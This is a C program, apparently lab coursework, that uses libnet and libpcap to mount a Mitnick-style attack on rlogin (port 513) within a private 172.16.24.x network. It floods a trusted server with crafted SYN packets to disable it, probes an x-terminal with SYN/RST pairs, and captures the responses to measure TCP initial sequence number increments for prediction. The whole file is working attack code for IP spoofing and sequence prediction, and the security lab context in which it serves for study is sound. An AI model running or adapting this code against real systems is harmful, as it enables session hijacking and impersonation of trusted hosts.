
#include "globals.h"
#include "typedef.h"
#include "utils_libnet.h"
#include "utils_libpcap.h"

#define DISABLE_HOST "disable"
#define ENABLE_HOST "enable"

void toggleServer(char *toggle) {
  Libnet libnet = makeLibnet();
  IPAddresses addresses = makeIPAddresses("172.16.24.2", "172.16.24.3");

  uint32_t payloadLength = strlen(toggle);

  uint16_t sourcePort = 530;
  uint16_t destinationPort = 513;
  uint32_t sequenceNumber = 128000;
  uint32_t acknowledgementNumber = 0;

  PayloadOptions payloadOptions =
      makePayloadOptions(toggle, payloadLength, libnet, 0);
  TCPOptions tcpOptions =
      makeTCPOptions(sourcePort, destinationPort, sequenceNumber,
                     acknowledgementNumber, TH_SYN, payloadLength, libnet, 0);
  IPv4Options ipv4Options = makeIPv4TCPOptions(
      addresses.source, addresses.destination, payloadLength, libnet, 0);

  addPayloadToContext(payloadOptions);
  addTCPToContext(tcpOptions);
  addIPv4ToContext(ipv4Options);

  if (strcmp(toggle, DISABLE_HOST) == 0) {
    for (int i = 0; i < 10; i++) {
      libnet_write(libnet.context);
    }
  } else if (strcmp(toggle, ENABLE_HOST) == 0) {
    libnet_write(libnet.context);
  }
  freeLibnet(libnet);
}

void probeXterminal() {
  Libnet ACKLibnet = makeLibnet();
  IPAddresses addresses = makeIPAddresses("172.16.24.2", "172.16.24.4");

  uint16_t sourcePort = 530;
  uint16_t destinationPort = 513;
  uint32_t sequenceNumber = 128000;
  uint32_t acknowledgementNumber = 0;
  uint32_t payloadLength = 0;

  TCPOptions tcpACKOptions = makeTCPOptions(
      sourcePort, destinationPort, sequenceNumber, acknowledgementNumber,
      TH_SYN, payloadLength, ACKLibnet, 0);
  IPv4Options ipv4ACKOptions = makeIPv4TCPOptions(
      addresses.source, addresses.destination, payloadLength, ACKLibnet, 0);

  addTCPToContext(tcpACKOptions);
  addIPv4ToContext(ipv4ACKOptions);

  Libnet RSTLibnet = makeLibnet();
  TCPOptions tcpRSTOptions = tcpACKOptions;
  IPv4Options ipv4RSTOptions = ipv4ACKOptions;
  tcpRSTOptions.sequence += 1;
  tcpRSTOptions.control = TH_RST;
  tcpRSTOptions.libnet = RSTLibnet;
  ipv4RSTOptions.libnet = RSTLibnet;

  addTCPToContext(tcpRSTOptions);
  addIPv4ToContext(ipv4RSTOptions);

  libnet_write(ACKLibnet.context);
  usleep(2000);
  libnet_write(RSTLibnet.context);

  freeLibnet(ACKLibnet);
  freeLibnet(RSTLibnet);
}

void calculateISN() {
  const u_char *data = NULL;
  struct pcap_pkthdr *header = NULL;
  uint32_t isn = 0, prevIsn = 0, difference = 0, prevDifference = 0;

  Pcap pcap = makePcap("tcp and src host 172.16.24.4");
  for (size_t i = 0; i < 24; i++) {
    probeXterminal();
    pcap_next_ex(pcap.handle, &header, &data);
    Packet packet = makePacket(data);
    isn = byteToUint32littleEndian(packet.tcp->th_seq);
    if (prevIsn == 0) {
      prevIsn = isn;
      continue;
    }
    difference = prevIsn - isn;
    if (prevDifference == 0) {
      prevDifference = difference;
      continue;
    }
    printf("%d\n", prevDifference - difference);
    prevIsn = isn;
    prevDifference = difference;
  }
  freePcap(pcap);
}

int main(void) {
  calculateISN();
  return 0;
}
